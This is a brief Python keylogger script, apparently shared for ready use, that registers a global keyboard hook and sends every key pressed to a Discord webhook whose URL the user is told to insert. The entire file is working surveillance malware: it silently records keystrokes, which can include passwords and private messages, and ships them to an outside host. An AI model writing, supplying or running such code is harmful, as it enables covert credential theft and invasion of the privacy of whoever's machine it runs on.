import keyboard
import requests

# url =""
# add your discord webhook in the url variable
#********************AND YOU ARE READY TO GO********************#

def on_key_press(event):
    data = {
    "content":event.name
    }
    requests.post(url=url, data=data)
    
    
keyboard.on_press(on_key_press)
keyboard.wait()
